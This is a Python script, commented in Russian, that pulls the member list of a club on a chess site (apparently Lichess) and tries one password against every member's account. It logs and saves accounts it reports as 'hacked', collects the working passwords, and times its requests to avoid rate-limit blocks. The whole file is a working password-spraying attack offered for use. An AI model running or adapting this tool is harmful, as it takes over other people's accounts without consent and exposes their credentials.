import ndjson
import requests

import logging
from rich.logging import RichHandler

from config import *

FORMAT = "%(message)s"
logging.basicConfig(
    level=logging.INFO, format=FORMAT, datefmt="[%X]", handlers=[RichHandler()]
) # настройки для логгинга

log = logging.getLogger("rich") # инциализация лога

def start(password, team):
    print(yellow + "[..] Получаем список, это может занять некоторое время...")
    r_m = requests.get(f'https://{SERVER}/{API}/{TEAM}/' + team + f'/{USERS}')
    users = r_m.json(cls=ndjson.Decoder)

    # Выводим сообщение, что список готов
    print(green + f"[+] Список пользователей получен!")
    print(
        cyan + f"[TIP] Запрос {str(OK_RESPONSE)} означает, что акк взломан. {str(ERROR_RESPONSE)} - не получилось. {str(BLOCKED_RESPONSE)} - личесс заблокировал запрос(рекомендуется выключить программу)") # вывод подсказкм
    #
    print(green + f"Взломанные аккаунты будут сохранены в файл {CHECKING_PATH}/{team}.txt") # вывод о том куда будут сохранятся взломанные акки

    # Начинаем перебор
    k = 0
    for user in users:

        #   Получаем ник участника
        username = user[f"{JSON_USERNAME}"]

        if (len(username) < 4): continue # проверка на работоспособность имени пользователя, имя пользователя на личесе минимум из 4-х символов

        r = requests.post(f"https://{SERVER}/{LOGIN}",
                          data={JSON_PROXY_USERNAME: username, JSON_PROXY_PASSWORD: password, "remember": f"{str(REMEMBER)}"},
                          headers={"X-Requested-With": X_REQUESTED_WITH,
                                   "User-Agent": USER_AGENT}) # пытатаемся войти в акк

        if str(r) == f"<Response [{str(OK_RESPONSE)}]>" or r.text.find("this network") > -1:
            log.info(f"Пароль получен! ({r}) {username}: {password}")
            with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                h_list.write(f"{get_ts()} {r} {username}: {password} \n")

            with open(f"{PASSWORDS_POPULAR_PATH}", "a",
                      encoding="utf-8") as mb_list:  # сохраняем взломанный пароль в пароли типа МБ
                mb_list.write(f"{password} \n")

        elif str(r) == f"<Response [{str(ERROR_RESPONSE)}]>":
            log.info(f"{r}, {username}: {password}")

            if SAVE_EVERYTHING_CHECK:
                with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                    h_list.write(f"{get_ts()} {r} {username}: {password} \n")

        elif str(r) == f"<Response [{str(BLOCKED_RESPONSE)}]>":
            log.error(f"{r}, {username}: {password}")

            if SAVE_EVERYTHING_CHECK:
                with open(f"{CHECKING_PATH}/{team}.txt", "a", encoding="utf-8") as h_list:  # сохраняем акк
                    h_list.write(f"{get_ts()} {r} {username}: {password} \n")


        k += 1

        time.sleep(5)
        if k % 10 == 0:
            time.sleep(PASSWORDCHECK_TIMEOUT)  # ждем потому что таймаут после каждого 10 подбора


if __name__ == "__main__":
    start(password=input(green + "Введите пароль, которым вы хотите проверить клуб: " + white),
          team=input(yellow + "Введите ID клуба: " + white))
